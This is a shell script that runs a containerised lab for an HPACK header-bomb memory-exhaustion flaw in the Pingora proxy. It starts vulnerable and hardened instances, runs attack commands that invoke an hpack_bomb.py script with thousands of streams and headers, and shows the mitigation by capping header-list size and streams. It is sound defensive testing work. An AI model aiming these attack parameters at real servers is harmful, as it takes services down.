#!/usr/bin/env bash
set -euo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
COMPOSE=(docker compose -f "$DIR/docker-compose.yml")
CONTAINER="${CONTAINER:-pingora_hpack_lab}"
PORT="${PORT:-6145}"

usage() {
    cat <<'EOF'
Usage: ./run.sh <command>

Commands:
  build       Build the self-contained Pingora lab image
  start       Start vulnerable Pingora lab (6 GB cap, h2c on :6145)
  hardened    Start hardened lab (64 KiB header-list, 32 streams, :6146)
  stop        Stop and remove lab containers
  monitor     Monitor Pingora RSS in real time
  rss         One-shot RSS check
  logs        Tail Pingora logs
  shell       Shell into the vulnerable container
  attack128   Original hpack_poc shape: 128 streams x 32,000 headers
  attack2048  Large demo: 2048 streams x 32,000 headers
  oom2g       Demo: 2 GiB cap OOM with 2048 hpack_poc streams
  mitigated   Demo: same payload rejected by 64 KiB header-list cap

Environment:
  PORT        Host port for vulnerable lab (default 6145)
EOF
}

case "${1:-}" in
    build)
        "${COMPOSE[@]}" build pingora
        ;;
    start)
        "${COMPOSE[@]}" up -d --build pingora
        echo "Pingora vulnerable lab: h2c://127.0.0.1:6145"
        ;;
    hardened)
        "${COMPOSE[@]}" --profile hardened up -d --build pingora-hardened
        echo "Pingora hardened lab: h2c://127.0.0.1:6146"
        ;;
    stop)
        "${COMPOSE[@]}" --profile hardened down --remove-orphans
        ;;
    monitor)
        docker exec -it "$CONTAINER" python3 /poc/monitor_rss.py
        ;;
    rss)
        docker exec "$CONTAINER" ps -o pid,rss,vsz,comm -p 1
        docker stats --no-stream "$CONTAINER" || true
        ;;
    logs)
        docker logs -f "$CONTAINER"
        ;;
    shell)
        docker exec -it "$CONTAINER" bash
        ;;
    attack128)
        python3 "$DIR/attacker/hpack_bomb.py" --host 127.0.0.1 --port "$PORT" \
            --connections 1 --streams 128 --headers 32000 --hold 120
        ;;
    attack2048)
        python3 "$DIR/attacker/hpack_bomb.py" --host 127.0.0.1 --port "$PORT" \
            --connections 1 --streams 2048 --headers 32000 --hold 90
        ;;
    oom2g)
        docker build -f "$DIR/pingora-lab/Dockerfile" -t pingora-hpack-lab "$DIR"
        docker rm -f pingora_hpack_oom2g >/dev/null 2>&1 || true
        docker run -d --name pingora_hpack_oom2g \
            --memory=2g --memory-swap=2g \
            -e RUST_LOG=info \
            -p 6147:6145 pingora-hpack-lab >/dev/null
        sleep 1
        python3 "$DIR/attacker/hpack_bomb.py" --host 127.0.0.1 --port 6147 \
            --connections 1 --streams 2048 --headers 32000 --hold 5 || true
        docker inspect pingora_hpack_oom2g --format 'state={{.State.Status}} oom={{.State.OOMKilled}} exit={{.State.ExitCode}}' || true
        docker rm -f pingora_hpack_oom2g >/dev/null 2>&1 || true
        ;;
    mitigated)
        docker build -f "$DIR/pingora-lab/Dockerfile" -t pingora-hpack-lab "$DIR"
        docker rm -f pingora_hpack_mitigated >/dev/null 2>&1 || true
        docker run -d --name pingora_hpack_mitigated \
            --memory=512m --memory-swap=512m \
            -e RUST_LOG=info \
            -e PINGORA_H2_MAX_HEADER_LIST_SIZE=65536 \
            -e PINGORA_H2_MAX_CONCURRENT_STREAMS=32 \
            -p 6148:6145 pingora-hpack-lab >/dev/null
        sleep 1
        python3 "$DIR/attacker/hpack_bomb.py" --host 127.0.0.1 --port 6148 \
            --connections 1 --streams 64 --headers 32000 --hold 5 || true
        docker inspect pingora_hpack_mitigated --format 'state={{.State.Status}} oom={{.State.OOMKilled}} exit={{.State.ExitCode}}' || true
        docker stats --no-stream pingora_hpack_mitigated || true
        docker rm -f pingora_hpack_mitigated >/dev/null 2>&1 || true
        ;;
    *)
        usage
        ;;
esac
